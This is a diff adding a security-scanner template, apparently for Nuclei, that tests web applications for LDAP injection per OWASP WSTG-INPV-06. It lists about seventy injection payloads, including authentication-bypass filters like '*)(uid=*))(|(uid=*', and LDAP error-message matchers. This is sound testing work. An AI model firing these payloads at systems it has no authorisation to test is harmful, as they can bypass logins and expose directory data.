@@ -1,0 +1,233 @@
+# ============================================================================
+# WSTG-INPV-06: LDAP Injection (Universal)
+# Review status: ZACHOWANY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Powód decyzji: szablon spełnia wszystkie 6 kryteriów review (Coverage Matrix,
+# multi-warstwowe matchery z anti-FP, source comments, safety nets,
+# sweet spot payloadów, component fuzzing). OOB matcher nie jest dodany
+# świadomie: Brak natywnych OOB technik dla LDAP w typowych implementacjach.
+#
+# ============================================================================
+#
+# Coverage Matrix:
+#   ✓ AND/OR logic injection (*, *)(uid=*, etc.)
+#   ✓ Boolean wildcard (*)
+#   ✓ Null byte truncation (%00)
+#   ✓ Universal authentication bypass payloads
+#   ✓ Filter syntax break (unmatched parens)
+#   ✓ Active Directory specific
+#   ✗ Blind LDAP - wymaga differential/timing, nie pokrywamy w MVP
+#
+# Performance budget: low-medium (~80 payloads × 5 części)
+# Estimated time: ~5-10 min
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/LDAP Injection/Intruder/*
+#   2. seclists/Fuzzing/LDAP*
+#   3. hacktricks/.../ldap-injection
+# ============================================================================
+
+id: wstg-inpv-06-ldap-injection
+
+info:
+  name: "WSTG-INPV-06: LDAP Injection (Universal)"
+  author: pentest-team
+  severity: high
+  description: |
+    Wykrywa LDAP Injection przez wstrzykiwanie znaków specjalnych filter syntax
+    (*, (, ), |, &, !, =) i typowych payloadów authentication bypass.
+    Detekcja przez LDAP error messages oraz status code differential.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/ldap-injection
+  classification:
+    cwe-id: CWE-90
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 9.4
+  tags: dast,wstg,wstg-v42-inpv-06,ldap-injection,asvs-v5.3.6,burp-history
+
+variables:
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Single-character triggers
+        # Source: PayloadsAllTheThings/LDAP Injection
+        # ====================================================================
+        - "*"
+        - "("
+        - ")"
+        - "&"
+        - "|"
+        - "!"
+        - "="
+        - "*)"
+        - "*)("
+        - "(|"
+        - "(&"
+
+        # ====================================================================
+        # GROUP 2: Authentication bypass classics
+        # ====================================================================
+        - "*)(uid=*"
+        - "*)(uid=*))(|(uid=*"
+        - "*))(|(cn=*"
+        - "*))%00"
+        - "admin)(&)"
+        - "admin)(|(&"
+        - "admin*"
+        - "admin*)((|userPassword=*)"
+        - "*)(uid=admin"
+        - "*)(|(uid=admin)"
+        - "*))(|(objectClass=*"
+        - "*)(|(objectClass=*))"
+        - "*))%00))%00"
+        - "*())%00"
+
+        # ====================================================================
+        # GROUP 3: Wildcards in attribute values
+        # ====================================================================
+        - "*)(cn=*"
+        - "*)(mail=*"
+        - "*)(sAMAccountName=*"          # Active Directory
+        - "*)(userPrincipalName=*"
+        - "*)(memberOf=*"
+        - "*)(uid=a*"
+        - "*)(uid=*)((cn=*"
+
+        # ====================================================================
+        # GROUP 4: AND/OR boolean injection
+        # ====================================================================
+        - "(|(cn=*))"
+        - "(|(uid=*))"
+        - "(&(uid=*)(userPassword=*))"
+        - "(&(objectClass=*)(uid=*))"
+        - "(!(uid=admin))"
+        - ")(&"
+        - ")(|"
+        - ")(|(&"
+
+        # ====================================================================
+        # GROUP 5: Special chars / escape sequences
+        # ====================================================================
+        - "\\"
+        - "\\*"
+        - "\\("
+        - "\\)"
+        - "\\00"
+        - "%00"
+        - "%29"                            # URL-encoded )
+        - "%28"                            # URL-encoded (
+        - "%2A"                            # URL-encoded *
+        - "%5C"                            # URL-encoded \
+
+        # ====================================================================
+        # GROUP 6: Multi-char combo (filter break)
+        # ====================================================================
+        - "*)(&"
+        - "*))"
+        - "*))(|"
+        - "*))(|(uid=*"
+        - "*))(|(cn=*"
+        - "*))(|(objectClass=*"
+        - "*)(|(uid=*)(uid=*"
+
+        # ====================================================================
+        # GROUP 7: Empty / null - testing default behavior
+        # ====================================================================
+        - ""
+        - "1=1"
+        - "true"
+        - "*)(uid=*) "
+        - "(uid=*)"
+
+        # ====================================================================
+        # GROUP 8: Active Directory ldap_search_ext bypass
+        # ====================================================================
+        - "*)(samAccountName=*)"
+        - "*))(&(objectClass=user)(samAccountName=*"
+        - "*)(&(objectClass=user))"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - LDAP error messages
+      - type: regex
+        part: body
+        name: ldap-error
+        regex:
+          - "(?i)javax\\.naming\\.NameNotFoundException"
+          - "(?i)javax\\.naming\\.directory"
+          - "(?i)LDAPException"
+          - "(?i)com\\.sun\\.jndi\\.ldap"
+          - "(?i)protocol error"
+          - "(?i)bad search filter"
+          - "(?i)invalid dn syntax"
+          - "(?i)ldap_search.*?failed"
+          - "(?i)search filter syntax"
+          - "(?i)\\[LDAP: error code \\d+"
+          - "(?i)invalid attribute syntax"
+          - "(?i)object class violation"
+          - "(?i)admin limit exceeded"
+          - "(?i)unwilling to perform"
+          - "(?i)naming exception"
+          - "(?i)Bad search filter"
+          # PHP ldap
+          - "(?i)Warning.*?\\Wldap_"
+          - "(?i)ldap_(search|bind|connect)"
+          # .NET DirectoryServices
+          - "(?i)DirectoryServicesCOMException"
+          - "(?i)System\\.DirectoryServices"
+        condition: or
+
+      # Warstwa 2: SECONDARY
+      - type: dsl
+        dsl:
+          - "len(body) > 30"
+
+      # Warstwa 3: ANTI-FP - WAF block
+      - type: dsl
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked"))'
+
+      # Warstwa 4: ANTI-FP - timeout
+      - type: dsl
+        dsl:
+          - "duration < 30"
+
+    extractors:
+      - type: regex
+        name: ldap-error-snippet
+        part: body
+        regex:
+          - "(?i)(LDAPException|NameNotFoundException|protocol error|invalid dn syntax|ldap_[a-z_]+).{0,200}"
+
+# ============================================================================
+# Known limitations:
+# - Blind LDAP injection (bez error message) wymaga differential analysis -
+#   nie pokryte w tym szablonie. Patrz osobny szablon w przyszłości.
+# - Aplikacje opakowujące LDAP errors w generic 500 page generują FN
+# ============================================================================
